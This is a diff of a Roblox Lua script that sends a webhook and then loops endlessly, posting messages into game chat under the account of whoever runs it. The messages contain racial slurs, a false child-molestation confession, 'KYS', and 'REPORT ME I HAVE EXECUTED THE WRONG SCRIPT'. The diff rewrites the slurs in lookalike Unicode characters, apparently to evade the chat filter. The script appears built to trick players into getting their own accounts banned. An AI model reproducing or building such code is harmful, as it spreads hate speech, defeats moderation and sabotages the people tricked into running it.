@@ -83,9 +83,9 @@ local webhookData = createWebhookData()
 
 -- Sending the webhook
 sendWebhook(webhookUrl, webhookData)
-local message = "I MOLEST KIDS NIGGER NIGGER NIGGER KKK ON TOP BITCH KYS RETARD NIGGA!" -- Change this to any message you want
-local message2 = "IM A <EXPL<OIT<ER REPORT ME I HAVE EXECUTED THE WRONG SCRIPT!"
-local delayTime = 2 -- Time in seconds between messages
+local message = "I ɱο|ȇšţ κíđš ňíĝĝȇŕ ňíĝĝȇŕ ňíĝĝȇŕ κκκ οň ţοƥ ƀíţçħ κƴš ŕȇţåŕđ ňíĝĝå!" -- Change this to any message you want
+local message2 = "Iɱ å <ȇẋƥ|<οíţ<ȇŕ ŕȇƥοŕţ ɱȇ í ħåѷȇ ȇẋȇçûţȇđ ţħȇ wŕοňĝ šçŕíƥţ!"
+local delayTime = 2.5 -- Time in seconds between messages
 
 while true do
     -- Try using the new TextChatService first
@@ -95,13 +95,17 @@ while true do
     if textChannels then
         local generalChannel = textChannels:FindFirstChild("RBXGeneral")
         if generalChannel then
-            generalChannel:SendAsync(message, message2)
+            generalChannel:SendAsync(message)
+            wait(2)
+            generalChannel:SendAsync(message2)
+ 
         end
     else
         -- If new chat system fails, try the legacy chat system
         local chatEvent = game.ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
         if chatEvent then
             chatEvent.SayMessageRequest:FireServer(message, "All")
+            wait(2)
             chatEvent.SayMessageRequest:FireServer(message2, "All")
         else
             warn("No valid chat system found! Stopping script.")
